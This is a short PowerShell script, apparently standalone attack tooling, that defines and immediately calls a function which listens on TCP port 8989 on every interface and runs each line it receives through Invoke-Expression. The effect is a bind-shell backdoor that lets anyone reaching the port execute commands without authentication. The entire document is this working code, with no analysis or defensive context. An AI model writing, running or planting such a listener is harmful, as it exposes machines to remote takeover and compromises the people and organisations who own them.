function listen-port ($port=8989) {
    $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
    $listener = new-object System.Net.Sockets.TcpListener $endpoint
    $listener.start()

    do {
        Write-Host "[*] Listening for connection..."
        $client = $listener.AcceptTcpClient() # will block here until connection
        $stream = $client.GetStream();
        $reader = New-Object System.IO.StreamReader $stream
        do {

            $line = $reader.ReadLine()
            if ($line){
                write-host $line
                Try{
                    $out = (Invoke-Expression -Command $line 2>&1 | Out-String)
                } Catch {
                    Write-host $_
                    Write-Host -f red "ERROR: Command error"
                    break
                }
            }
        } while (($line) -and ($line -notmatch ([char]4)))
        $reader.Dispose()
        $stream.Dispose()
        $client.Dispose()
    } while ($line -ne ([char]4))
    $listener.stop()
}

listen-port

